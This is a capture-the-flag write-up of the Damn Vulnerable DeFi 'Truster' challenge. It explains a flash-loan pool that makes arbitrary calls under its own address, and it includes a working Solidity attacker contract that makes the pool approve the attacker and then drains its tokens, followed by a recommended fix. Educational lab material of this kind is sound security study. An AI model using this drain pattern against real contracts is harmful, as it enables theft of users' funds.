# Truster (Damn Vulnerable DeFi #3)

**Vulnerability class:** Arbitrary external call executed from the contract's own
identity, abused to grant a token allowance to the attacker.

## The goal

Drain all 1,000,000 DVT from the pool to a recovery address — in a single player
transaction.

## The flaw

The pool's flash loan lets the caller specify an arbitrary `target` and `data`,
which the pool then executes from its own address:

```solidity
function flashLoan(uint256 amount, address borrower, address target, bytes calldata data)
    external nonReentrant returns (bool)
{
    uint256 balanceBefore = token.balanceOf(address(this));
    token.transfer(borrower, amount);
    target.functionCall(data);   // pool calls an arbitrary contract as itself
    if (token.balanceOf(address(this)) < balanceBefore) revert RepayFailed();
    return true;
}
```

Because `functionCall` runs from the pool's address, the pool's `msg.sender` is
handed to the attacker. Pointing `target` at the token and putting
`approve(attacker, balance)` in `data` makes the pool approve the attacker to
spend all its tokens — no real loan needed (`amount = 0` keeps the balance check
happy).

## The exploit

A single attacker contract does both steps in its constructor (one deploy = one
player transaction):

```solidity
constructor(TrusterLenderPool pool, DamnValuableToken token, address recovery) {
    uint256 balance = token.balanceOf(address(pool));
    bytes memory data = abi.encodeCall(token.approve, (address(this), balance));
    pool.flashLoan(0, address(this), address(token), data);   // pool approves us
    token.transferFrom(address(pool), recovery, balance);     // we take everything
}
```

## The fix

Never execute user-controlled arbitrary calls from the contract's own identity. A
flash loan should hand control to the borrower's well-defined callback (the
ERC-3156 pattern), not call an attacker-chosen target with attacker-chosen data.
If arbitrary calls are unavoidable, strictly whitelist allowed targets and
function selectors.

## Lesson

`target.call(data)` with attacker-controlled arguments leaks the contract's
msg.sender. That identity controls token approvals and transfers — so the contract
can be tricked into approving or sending its own funds.
